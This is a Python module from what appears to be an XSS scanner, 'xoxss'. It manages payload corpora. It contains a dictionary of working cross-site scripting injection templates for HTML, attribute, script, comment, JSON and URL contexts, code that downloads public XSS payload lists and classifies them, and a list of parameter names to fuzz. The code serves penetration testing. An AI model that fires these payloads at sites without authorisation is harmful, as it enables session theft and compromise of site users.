"""
Payload corpora, remote payload downloading, caching, classification, and marker embedding.
"""

from __future__ import annotations

import copy
import hashlib
import json
import os
import random
import re
import shutil
import tempfile
import time
import urllib.request
import uuid
from contextlib import suppress
from pathlib import Path
from typing import Dict, List, Optional, Sequence, Set, Tuple

from xoxss.core.http import USER_AGENT
from xoxss.detection.payload import (
    CATALOG_SOURCE,
    catalog_by_context,
    catalog_counts,
    catalog_total,
)
from xoxss.utils.console import Console, js_marker, truncate

_DIALOG_NAME_RE = re.compile(r"\b(?P<fn>alert|confirm|prompt)\b", re.IGNORECASE)


def _matching_paren(text: str, start: int) -> Optional[int]:
    """Return the index of the ``)`` that closes ``text[start]``.

    Quotes and escapes are skipped so nested calls such as
    ``alert(String.fromCharCode(88, 83, 83))`` close on the right paren.
    """
    depth = 0
    quote = ""
    escaped = False
    for index in range(start, len(text)):
        char = text[index]
        if quote:
            if escaped:
                escaped = False
            elif char == "\\":
                escaped = True
            elif char == quote:
                quote = ""
            continue
        if char in "'\"`":
            quote = char
        elif char == "(":
            depth += 1
        elif char == ")":
            depth -= 1
            if depth == 0:
                return index
    return None


def _rewrite_dialog_calls(payload: str, call: str) -> str:
    """Replace ``alert``/``confirm``/``prompt`` calls with a marker call.

    Balanced-parenthesis scanning keeps nested expressions intact, unlike a
    flat regex, so catalog vectors that already use ``String.fromCharCode`` do
    not acquire an extra ``)``.
    """
    pieces: List[str] = []
    cursor = 0
    while cursor < len(payload):
        match = _DIALOG_NAME_RE.search(payload, cursor)
        if match is None:
            pieces.append(payload[cursor:])
            break
        end = match.end()
        probe = end
        while probe < len(payload) and payload[probe].isspace():
            probe += 1
        closing: Optional[int] = None
        if probe < len(payload) and payload[probe] == "(":
            closing = _matching_paren(payload, probe)
        elif probe < len(payload) and payload[probe] == "`":
            tick = payload.find("`", probe + 1)
            if tick != -1:
                closing = tick
        if closing is None:
            pieces.append(payload[cursor:end])
            cursor = end
            continue
        pieces.append(payload[cursor:match.start()])
        pieces.append(f"{match.group('fn')}({call})")
        cursor = closing + 1
    return "".join(pieces)

PAYLOAD_SOURCES: Tuple[str, ...] = (
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/robot-friendly/XSS-payloadbox.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/robot-friendly/XSS-Bypass-Strings-BruteLogic.txt",
    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/README.md",
)

MAX_PAYLOAD_BYTES = 4 * 1024 * 1024
MAX_REMOTE_PAYLOADS = 5000
PAYLOAD_CACHE_TTL = 24 * 60 * 60.0
PAYLOAD_CACHE_MAX_BYTES = 2 * 1024 * 1024
PAYLOAD_CACHE_DIRNAME = "xoxss-payload-cache"

FUZZ_PARAM_NAMES: Tuple[str, ...] = (
    "q", "s", "search", "query", "keyword", "keywords", "term", "filter",
    "name", "id", "page", "title", "content", "text", "input", "value",
    "email", "username", "user", "userid", "account",
    "redirect_url", "redirect_uri", "redirectTo", "returnTo", "return_url",
    "return_uri", "ruri", "next_url", "continueUrl", "goto", "dest",
    "destination", "forward", "link", "path", "uri", "u", "to", "rurl",
    "url", "redirect", "return", "returnUrl", "next", "continue",
    "callback", "cb", "go", "target", "out", "jump", "r", "host",
    "template", "tpl", "view", "section", "lang", "locale", "format",
    "mode", "sort", "order", "action", "type", "page_id", "layout", "theme",
    "comment", "msg", "body", "description", "summary", "message",
    "error", "errors", "status", "code", "reason", "note",
    "hl", "q0", "s0", "sh", "redir", "u1", "d", "x",
)

DEFAULT_PAYLOADS: Dict[str, List[str]] = {
    "html": [
        "<script>{m}</script>",
        "<img src=x onerror=\"{m}\">",
        "<svg onload=\"{m}\">",
        "<details open ontoggle=\"{m}\">",
        "<input autofocus onfocus=\"{m}\">",
        "<body onload=\"{m}\">",
        "<iframe srcdoc=\"<script>{m}</script>\">",
        "<video><source onerror=\"{m}\"></video>",
        "<math><mtext><table><mglyph><style><img src=x onerror=\"{m}\">",
    ],
    "attr_double": [
        "\" onmouseover=\"{m}\" x=\"",
        "\" autofocus onfocus=\"{m}\" x=\"",
        "\"><script>{m}</script>",
        "\"><img src=x onerror=\"{m}\">",
        "\" onpointerover=\"{m}\" x=\"",
    ],
    "attr_single": [
        "' onmouseover='{m}' x='",
        "' autofocus onfocus='{m}' x='",
        "'><script>{m}</script>",
        "'><img src=x onerror='{m}'>",
    ],
    "attr_unquoted": [
        " onmouseover={m} x=",
        " autofocus onfocus={m} x=",
        "><script>{m}</script>",
    ],
    "script": [
        "';{m};//",
        "\";{m};//",
        "</script><script>{m}</script>",
        "`;{m};//",
        "*/{m}/*",
        "\\';{m};//",
    ],
    "style": [
        "</style><script>{m}</script>",
        "</style><img src=x onerror=\"{m}\">",
    ],
    "comment": [
        "--><script>{m}</script><!--",
        "--!><script>{m}</script><!--",
        "--><img src=x onerror=\"{m}\"><!--",
    ],
    "json": [
        "\\u003cscript\\u003e{m}\\u003c/script\\u003e",
        "\\u003cimg src=x onerror={m}\\u003e",
        "</script><script>{m}</script>",
    ],
    "url": [
        "javascript:{m}",
        "javascript:/*{m}*/",
    ],
    "generic": [
        "<script>{m}</script>",
        "\"><img src=x onerror=\"{m}\">",
        "'><svg onload='{m}'>",
        "<img src=x onerror=\"{m}\">",
    ],
}


def _plausible_remote_payload(line: str) -> bool:
    """Filter noise out of downloaded payload files."""
    if not line or len(line) > 2048:
        return False
    if line.startswith(("#", "//", "<!--", "/*", "*", "|", "-", ">")):
        return False
    lowered = line.lower()
    stripped = lowered.strip()
    if stripped in {"<html>", "</html>", "<body>", "</body>", "<head>", "</head>", "<!doctype html>"}:
        return False
    if lowered.startswith(("http://", "https://")) and "<" not in line:
        return False
    if "<" in line:
        return True
    if "javascript:" in lowered:
        return True
    if re.search(r"\bon[a-z]{3,}\s*=", lowered):
        return True
    if re.search(r"\b(?:alert|prompt|confirm)\s*\(", lowered):
        return True
    return False


def classify_remote_payload(payload: str) -> str:
    """Categorize a payload into its primary breakout context."""
    lowered = payload.lower()
    stripped = payload.lstrip()
    if "javascript:" in lowered:
        return "url"
    if "</script" in lowered or lowered.startswith(("';", "\";", "`;")):
        return "script"
    if stripped.startswith('"'):
        return "attr_double"
    if stripped.startswith("'"):
        return "attr_single"
    if "<script" in lowered or "srcdoc" in lowered:
        return "html"
    return "generic"


def embed_marker(payload: str, marker: str, context: str = "") -> str:
    """Insert quote-free execution marker into an arbitrary payload string."""
    if re.search(r"<script[^>]*\bsrc\s*=", payload, re.I):
        return f"{payload}<script>{marker}</script>"
    if re.search(r"</script\s*>", payload, re.I):
        return re.sub(r"</script\s*>", lambda match: f";{marker}" + match.group(0), payload, count=1, flags=re.I)
    if context in ("script", "url"):
        return f"{payload};{marker}"
    quoted = re.search(r"(on[a-zA-Z]+\s*=\s*)([\"'])(.*?)\2", payload, re.S | re.I)
    if quoted:
        return (
            payload[: quoted.start(3)]
            + quoted.group(3)
            + ";"
            + marker
            + payload[quoted.end(3):]
        )
    unquoted = re.search(r"(on[a-zA-Z]+\s*=\s*)([^\s>]+)", payload, re.I)
    if unquoted:
        return payload[: unquoted.end(2)] + ";" + marker + payload[unquoted.end(2):]
    if payload.lstrip().lower().startswith("javascript:"):
        return f"{payload};{marker}"
    return f"{payload}<script>{marker}</script>"


def payload_workdir(base_dir: Optional[str] = None) -> Path:
    """Create a temporary directory path for downloaded payloads."""
    root = Path(base_dir) if base_dir else Path(os.environ.get("XOXSS_TMPDIR") or tempfile.gettempdir())
    return root / f"xoxss-payloads-{os.getpid()}-{uuid.uuid4().hex[:8]}"


def payload_cache_path(
    sources: Sequence[str],
    limit: int,
    base_dir: Optional[str] = None,
) -> Optional[Path]:
    """Return the cache file for a source set, or None if disabled."""
    if os.environ.get("XOXSS_NO_PAYLOAD_CACHE"):
        return None
    explicit = os.environ.get("XOXSS_PAYLOAD_CACHE_DIR")
    if explicit:
        root = Path(explicit)
    else:
        root = Path(base_dir) if base_dir else Path(
            os.environ.get("XOXSS_TMPDIR") or tempfile.gettempdir()
        )
        root = root / PAYLOAD_CACHE_DIRNAME
    key = hashlib.sha1(
        ("\n".join(sorted(sources)) + f"|{limit}").encode("utf-8", "replace")
    ).hexdigest()[:20]
    return root / f"payloads-{key}.txt"


def read_payload_cache(
    path: Optional[Path],
    ttl: float = PAYLOAD_CACHE_TTL,
) -> Optional[List[str]]:
    """Read a fresh cache entry, returning None on miss or expiration."""
    if path is None:
        return None
    try:
        stat = path.stat()
    except OSError:
        return None
    if ttl > 0 and time.time() - stat.st_mtime > ttl:
        return None
    if stat.st_size <= 0 or stat.st_size > PAYLOAD_CACHE_MAX_BYTES:
        return None
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return None
    entries = []
    for line in text.splitlines():
        payload = line.strip()
        if not payload or payload.startswith("#"):
            continue
        if len(payload) > 4096 or not _plausible_remote_payload(payload):
            continue
        entries.append(payload)
        if len(entries) >= MAX_REMOTE_PAYLOADS:
            break
    return entries or None


def write_payload_cache(
    path: Optional[Path],
    payloads: Sequence[str],
) -> None:
    """Atomically persist a bounded cache entry."""
    if path is None or not payloads:
        return
    body = "\n".join(payloads).encode("utf-8", "replace")[:PAYLOAD_CACHE_MAX_BYTES]
    temporary: Optional[Path] = None
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        temporary = path.with_name(path.name + f".{os.getpid()}.tmp")
        temporary.write_bytes(body)
        os.replace(temporary, path)
    except OSError:
        if temporary is not None:
            with suppress(OSError):
                temporary.unlink()


def download_payload_lists(
    console: Console,
    sources: Sequence[str],
    limit: int,
    base_dir: Optional[str] = None,
    work_dir: Optional[Path] = None,
) -> Tuple[List[Path], Optional[Path]]:
    """Download public XSS payload lists into temporary storage."""
    if limit <= 0 or limit > MAX_REMOTE_PAYLOADS:
        limit = MAX_REMOTE_PAYLOADS
    work = work_dir or payload_workdir(base_dir)
    try:
        work.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        console.warn(f"Cannot create temporary payload directory {work}: {exc}")
        return [], None

    cache = payload_cache_path(sources, limit, base_dir)
    chosen = read_payload_cache(cache)
    if chosen is not None:
        console.info(f"Using {len(chosen)} cached XSS payload(s) from {cache}")
    else:
        console.info(f"Downloading XSS payload lists ({len(sources)} source(s)) -> {work}")
        batches: List[List[str]] = []
        seen: Set[str] = set()
        for url in sources:
            try:
                request = urllib.request.Request(
                    url,
                    headers={"User-Agent": USER_AGENT, "Accept": "text/plain,*/*"},
                )
                with urllib.request.urlopen(request, timeout=25) as response:
                    raw = response.read(MAX_PAYLOAD_BYTES + 1)
                if len(raw) > MAX_PAYLOAD_BYTES:
                    raw = raw[:MAX_PAYLOAD_BYTES]
                text = raw.decode("utf-8", "replace")
            except Exception as exc:
                console.warn(f"Payload source failed ({type(exc).__name__}: {exc}): {truncate(url, 110)}")
                continue

            batch: List[str] = []
            for raw_line in text.splitlines():
                line = raw_line.strip()
                if not _plausible_remote_payload(line) or line in seen:
                    continue
                seen.add(line)
                batch.append(line)
                if len(batch) >= limit:
                    break
            if batch:
                batches.append(batch)
                console.debug(f"{truncate(url, 100)} -> {len(batch)} candidate payload(s)")
            else:
                console.debug(f"No usable payloads found in {truncate(url, 110)}")

        if not batches:
            shutil.rmtree(work, ignore_errors=True)
            console.warn("Remote payload download failed; using built-in payloads")
            return [], None

        chosen = []
        cursor = 0
        while len(chosen) < limit:
            progressed = False
            for batch in batches:
                if cursor < len(batch) and len(chosen) < limit:
                    chosen.append(batch[cursor])
                    progressed = True
            if not progressed:
                break
            cursor += 1
        write_payload_cache(cache, chosen)

    path = work / "payloads.txt"
    try:
        path.write_text("\n".join(chosen) + "\n", encoding="utf-8")
    except OSError as exc:
        console.warn(f"Cannot write payload cache {path}: {exc}")
        shutil.rmtree(work, ignore_errors=True)
        return [], None

    console.ok(f"Loaded {len(chosen)} remote XSS payload(s) into temporary storage", important=False)
    return [path], work


def cleanup_payload_lists(work: Optional[Path], keep: bool, console: Console) -> None:
    """Clean up downloaded temporary payload directories."""
    if work is None:
        return
    if keep:
        console.info(f"Keeping temporary payloads at {work} (--keep-payloads)")
        return
    shutil.rmtree(work, ignore_errors=True)
    console.debug(f"Removed temporary payload directory {work}")


LAZY_PAYLOAD_FILE = Path(__file__).resolve().parent.parent / "data" / "lazyxss.txt"


class PayloadEngine:
    """Manages built-in context payloads, custom files, and remote payload pools."""
    CONTEXTS = tuple(DEFAULT_PAYLOADS.keys())

    def __init__(
        self,
        console: Console,
        extra_file: Optional[str] = None,
        remote_files: Optional[Sequence[str]] = None,
        corpus_dirs: Optional[Sequence[str]] = None,
        lazy_payloads: bool = True,
        catalog_payloads: bool = True,
    ) -> None:
        self.console = console
        self.payloads: Dict[str, List[str]] = {key: list(value) for key, value in DEFAULT_PAYLOADS.items()}
        self.remote_payloads: List[str] = []
        self.lazy_payloads: List[str] = []
        self.catalog: Dict[str, List[str]] = {}
        self._lazy_by_context: Dict[str, List[str]] = {}
        self._lazy_pool_cache: Dict[str, List[str]] = {}
        self._base_cache: Dict[str, Tuple[str, ...]] = {}
        self._remote_set: Set[str] = set()
        self._seen: Set[str] = {payload for values in self.payloads.values() for payload in values}
        self._seen_slots: Set[Tuple[str, str]] = {
            (context, payload)
            for context, values in self.payloads.items()
            for payload in values
        }
        if catalog_payloads:
            for context in self.payloads:
                pool = catalog_by_context(context, auto_only=True, fallback=False)
                if pool:
                    self.catalog[context] = pool
            if self.catalog:
                self.console.debug(
                    f"Bundled payload catalog: {catalog_total()} vector(s) in "
                    f"{len(catalog_counts())} families ({CATALOG_SOURCE})"
                )
        if extra_file:
            for path in extra_file.split(os.pathsep):
                if path.strip():
                    self._load_file(path.strip())
        for directory in corpus_dirs or []:
            self._load_dir(directory)
        for path in remote_files or []:
            self._load_file(path, remote=True, quiet=True)
        if lazy_payloads:
            self._load_lazy_corpus()

    def clone(self) -> "PayloadEngine":
        """Copy the engine so a target can register payloads in isolation.

        The engine is cached on the argument namespace and reused for every
        target in a run, but framework bypasses are registered per target.
        Sharing the mutable pools would leak target A's bypasses into target B,
        so each scanner gets its own structural copy of the pool containers
        (the payload strings themselves are shared and never mutated).
        """
        clone = copy.copy(self)
        clone.payloads = {context: list(values) for context, values in self.payloads.items()}
        clone.remote_payloads = list(self.remote_payloads)
        clone.lazy_payloads = list(self.lazy_payloads)
        clone.catalog = {context: list(values) for context, values in self.catalog.items()}
        clone._lazy_by_context = {
            context: list(values) for context, values in self._lazy_by_context.items()
        }
        clone._lazy_pool_cache = {}
        clone._base_cache = {}
        clone._remote_set = set(self._remote_set)
        clone._seen = set(self._seen)
        clone._seen_slots = set(self._seen_slots)
        return clone

    def _invalidate_pools(self) -> None:
        """Drop derived pools after the underlying corpus changes."""
        self._base_cache.clear()
        self._lazy_pool_cache.clear()

    def _load_lazy_corpus(self, limit: int = 12000) -> None:
        path = LAZY_PAYLOAD_FILE
        if not path.is_file():
            self.console.debug(f"Bundled payload pack not found: {path}")
            return
        added = 0
        seen: Set[str] = set()
        try:
            with open(path, "r", encoding="utf-8-sig", errors="replace") as handle:
                for raw in handle:
                    payload = raw.strip()
                    if not payload or len(payload) > 2048:
                        continue
                    if payload in seen or payload in self._seen:
                        continue
                    lowered = payload.lower()
                    if not any(
                        marker in lowered
                        for marker in (
                            "<", "javascript:", "onerror", "onload", "onfocus",
                            "alert", "prompt", "confirm", "eval(", "settimeout(",
                            "%3c", "&lt;", "&lpar;", "&#", "svg", "script",
                            "iframe", "srcdoc", "formaction", "document.",
                            "window[", "top[", "constructor", "\\x", "\\u",
                        )
                    ):
                        continue
                    seen.add(payload)
                    self.lazy_payloads.append(payload)
                    context = classify_remote_payload(payload)
                    self._lazy_by_context.setdefault(context, []).append(payload)
                    if context != "generic":
                        self._lazy_by_context.setdefault("generic", []).append(payload)
                    added += 1
                    if added >= limit:
                        break
        except OSError as exc:
            self.console.warn(f"Could not read bundled payload pack {path}: {exc}")
            return
        if added:
            self.console.ok(
                f"Bundled LazyXss payload pack: {added} payload(s) ({path.name})",
                important=False,
            )

    def _load_dir(self, directory: str) -> None:
        root = Path(directory).expanduser()
        if not root.is_dir():
            self.console.warn(f"Payload directory not found: {directory}")
            return
        files = sorted(
            path
            for path in root.rglob("*")
            if path.is_file() and path.suffix.lower() in (".txt", ".lst", ".json")
        )
        if not files:
            self.console.warn(f"No .txt/.lst/.json payload files under {directory}")
            return
        for path in files:
            self._load_file(str(path))
        self.console.ok(f"Payload corpus: {len(files)} file(s) under {directory}", important=False)

    def _load_json(self, path: str, quiet: bool = False) -> int:
        added = 0
        try:
            with open(path, "r", encoding="utf-8-sig", errors="replace") as handle:
                data = json.load(handle)
        except (OSError, ValueError) as exc:
            self.console.warn(f"Could not read payload JSON {path}: {exc}")
            return 0
        items = data.get("payloads") if isinstance(data, dict) else data
        if not isinstance(items, list):
            self.console.warn(f"Payload JSON {path} is not a list: expected [\"payload\", ...]")
            return 0
        for item in items:
            if isinstance(item, str):
                payload, context = item.strip(), "generic"
                if "|" in payload:
                    prefix, rest = payload.split("|", 1)
                    if prefix.strip().lower() in self.payloads:
                        context, payload = prefix.strip().lower(), rest.strip()
            elif isinstance(item, dict):
                payload = str(item.get("payload") or "").strip()
                context = str(item.get("context") or "generic").lower()
            else:
                continue
            if not payload or payload.startswith("#"):
                continue
            if context not in self.payloads:
                context = "generic"
            if (context, payload) in self._seen_slots:
                continue
            self._seen_slots.add((context, payload))
            self._seen.add(payload)
            self.payloads[context].append(payload)
            added += 1
        if added:
            self._invalidate_pools()
        if added and not quiet:
            self.console.ok(f"Loaded {added} payload(s) from JSON {path}", important=False)
        return added

    def _load_file(self, path: str, remote: bool = False, quiet: bool = False) -> None:
        file_path = Path(path).expanduser()
        if not file_path.is_file():
            self.console.warn(f"Payload file not found: {path}")
            return
        if file_path.suffix.lower() == ".json":
            self._load_json(str(file_path), quiet=quiet)
            return
        added = 0
        try:
            with open(file_path, "r", encoding="utf-8", errors="replace") as handle:
                for line in handle:
                    payload = line.strip()
                    if not payload or payload.startswith("#"):
                        continue
                    if remote:
                        if payload in self._remote_set:
                            continue
                        self._remote_set.add(payload)
                        self.remote_payloads.append(payload)
                        added += 1
                        continue
                    context = "generic"
                    if "|" in payload:
                        prefix, rest = payload.split("|", 1)
                        if prefix.strip().lower() in self.payloads:
                            context = prefix.strip().lower()
                            payload = rest.strip()
                    if (context, payload) in self._seen_slots:
                        continue
                    self._seen_slots.add((context, payload))
                    self._seen.add(payload)
                    self.payloads[context].append(payload)
                    added += 1
        except OSError as exc:
            self.console.warn(f"Could not read payload file {path}: {exc}")
            return
        if added:
            self._invalidate_pools()
        if added and not quiet:
            kind = "remote" if remote else "custom"
            self.console.ok(f"Loaded {added} {kind} payload(s) from {path}", important=False)

    def _register(self, context: str, payload: str) -> bool:
        slot = (context, payload)
        if slot in self._seen_slots:
            return False
        self._seen_slots.add(slot)
        self._seen.add(payload)
        self.payloads.setdefault(context, []).append(payload)
        self._invalidate_pools()
        return True

    def probe(self, token: str) -> str:
        return f"{token} <>\"'`()=/\\\\"

    def _lazy_pool_for(self, context: str) -> List[str]:
        cached = self._lazy_pool_cache.get(context)
        if cached is not None:
            return cached
        contexts: List[str] = []
        if context in self._lazy_by_context:
            contexts.append(context)
        if "generic" in self._lazy_by_context:
            contexts.append("generic")
        seen: Set[str] = set(self._seen)
        pool: List[str] = []
        for ctx in contexts:
            for template in self._lazy_by_context.get(ctx, []):
                if template in seen:
                    continue
                seen.add(template)
                pool.append(template)
        self._lazy_pool_cache[context] = pool
        return pool

    def _base_pool(self, context: str) -> Tuple[str, ...]:
        """Curated templates for ``context`` plus its fallbacks, cached.

        Rebuilding this list per injection point dominated ``payloads_for``
        once an operator supplied a large corpus, so the result is cached and
        invalidated whenever the corpus changes.
        """
        cached = self._base_cache.get(context)
        if cached is not None:
            return cached
        contexts = [context] if context in self.payloads else []
        for fallback in ("generic", "html"):
            if fallback not in contexts:
                contexts.append(fallback)
        seen: Set[str] = set()
        base: List[str] = []
        for ctx in contexts:
            for template in self.payloads.get(ctx, []):
                if template in seen or template in self._remote_set:
                    continue
                seen.add(template)
                base.append(template)
        pool = tuple(base)
        self._base_cache[context] = pool
        return pool

    def payloads_for(self, context: str, limit: Optional[int] = None) -> List[str]:
        base = list(self._base_pool(context))
        lazy_pool = self._lazy_pool_for(context)

        if limit is None:
            return (
                base
                + [payload for payload in self.remote_payloads if payload not in self._seen]
                + lazy_pool
            )

        limit = max(1, limit)
        used: Set[str] = set()
        result: List[str] = []

        def take(pool: Sequence[str], quota: int) -> None:
            """Append up to ``quota`` distinct, unused entries from ``pool``.

            Large pools (LazyXss holds ~7k vectors) used to be filtered into a
            fresh candidate list on every call, which is quadratic once the
            same pool is drawn from several times per injection point.  Sample
            indices instead and fall back to a full scan only when the sample
            comes up short.
            """
            if quota <= 0 or not pool:
                return
            size = len(pool)
            quota = min(quota, size)
            picked = 0
            if size > quota * 4:
                for index in random.sample(range(size), min(size, quota * 4)):
                    item = pool[index]
                    if item in used:
                        continue
                    used.add(item)
                    result.append(item)
                    picked += 1
                    if picked >= quota:
                        return
            for item in pool:
                if picked >= quota:
                    return
                if item in used:
                    continue
                used.add(item)
                result.append(item)
                picked += 1

        catalog_pool = self.catalog.get(context, [])
        if catalog_pool:
            # Curated payloads stay first, the bundled repo catalog gets a
            # meaningful share, and LazyXss/downloaded corpora fill the rest.
            base_quota = max(1, limit // 2)
            catalog_quota = max(1, int(limit * 0.3)) if limit >= 3 else 0
            remaining = max(0, limit - base_quota - catalog_quota)
            lazy_quota = min(remaining, max(1, int(limit * 0.15))) if lazy_pool else 0
            remote_quota = remaining - lazy_quota if self.remote_payloads else 0
            if not self.remote_payloads:
                lazy_quota = remaining
            take(base[:base_quota], base_quota)
            take(catalog_pool, catalog_quota)
            take(lazy_pool, lazy_quota)
            take(self.remote_payloads, remote_quota)
            # Fill any shortfall (small pools, duplicates) in priority order.
            take(base[base_quota:], limit - len(result))
            take(catalog_pool, limit - len(result))
            take(lazy_pool, limit - len(result))
            take(self.remote_payloads, limit - len(result))
        elif lazy_pool:
            # 50% curated, 30% LazyXss, 20% downloaded corpus.  At least one
            # curated payload is always kept so small limits stay reliable.
            base_quota = max(1, limit // 2)
            lazy_quota = min(max(1, int(limit * 0.3)), max(0, limit - base_quota))
            remote_quota = max(0, limit - base_quota - lazy_quota)
            if not self.remote_payloads:
                lazy_quota += remote_quota
                remote_quota = 0
            take(base[:base_quota], base_quota)
            take(lazy_pool, lazy_quota)
            take(self.remote_payloads, remote_quota)
            # Fill any shortfall (small pools, duplicates) from the remaining
            # curated payloads first, then the extended pools.
            take(base[base_quota:], limit - len(result))
            take(lazy_pool, limit - len(result))
            take(self.remote_payloads, limit - len(result))
        else:
            remote_quota = max(1, limit // 3) if self.remote_payloads else 0
            base_quota = max(0, limit - remote_quota)
            take(base, base_quota)
            take(self.remote_payloads, remote_quota)
            take(base[base_quota:], limit - len(result))
        return result[:limit]

    def render(self, template: str, token: str, context: str = "") -> str:
        marker = js_marker(token)
        codes = ",".join(str(ord(ch)) for ch in token)
        # Substitute dialog calls (including nested fromCharCode forms) with
        # the unique per-payload marker.
        template = _rewrite_dialog_calls(template, f"String.fromCharCode({codes})")
        if "{m}" in template:
            return template.replace("{m}", marker)
        if "{t}" in template:
            return template.replace("{t}", token)
        return embed_marker(template, marker, context)


__all__ = [
    "PAYLOAD_SOURCES",
    "MAX_PAYLOAD_BYTES",
    "MAX_REMOTE_PAYLOADS",
    "PAYLOAD_CACHE_TTL",
    "PAYLOAD_CACHE_MAX_BYTES",
    "PAYLOAD_CACHE_DIRNAME",
    "FUZZ_PARAM_NAMES",
    "DEFAULT_PAYLOADS",
    "_plausible_remote_payload",
    "classify_remote_payload",
    "embed_marker",
    "payload_workdir",
    "payload_cache_path",
    "read_payload_cache",
    "write_payload_cache",
    "download_payload_lists",
    "cleanup_payload_lists",
    "LAZY_PAYLOAD_FILE",
    "PayloadEngine",
]

